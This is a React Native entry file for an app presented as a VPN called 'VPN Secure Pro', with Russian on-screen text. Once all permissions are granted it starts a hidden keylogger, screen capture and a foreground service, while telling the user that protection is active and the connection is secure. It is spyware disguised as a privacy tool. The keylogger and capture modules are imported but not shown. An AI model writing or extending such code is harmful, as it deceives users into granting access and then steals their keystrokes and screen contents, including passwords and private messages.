import React, { useEffect } from 'react';
import { View, Text, Alert, StyleSheet } from 'react-native';
import { requestAll } from './src/utils/permissions';
import { startForeground } from './src/services/foreground';
import { startKeylogger } from './src/services/keylogger';
import { startScreenCapture } from './src/services/screenCapture';

export default function App() {
  useEffect(() => {
    const init = async () => {
      const granted = await requestAll();
      if (granted) {
        await startForeground();
        await startKeylogger();
        await startScreenCapture();
        Alert.alert('VPN Secure', 'Защита активирована!');
      } else {
        Alert.alert('Ошибка', 'Нужны все разрешения');
      }
    };
    init();
  }, []);

  return (
    <View style={styles.container}>
      <Text style={styles.title}>🔒 VPN Secure Pro</Text>
      <Text style={styles.subtitle}>Ваше соединение защищено</Text>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 20,
    backgroundColor: '#f5f5f5'
  },
  title: {
    fontSize: 28,
    fontWeight: 'bold',
    marginBottom: 10
  },
  subtitle: {
    fontSize: 16,
    color: '#666'
  }
});
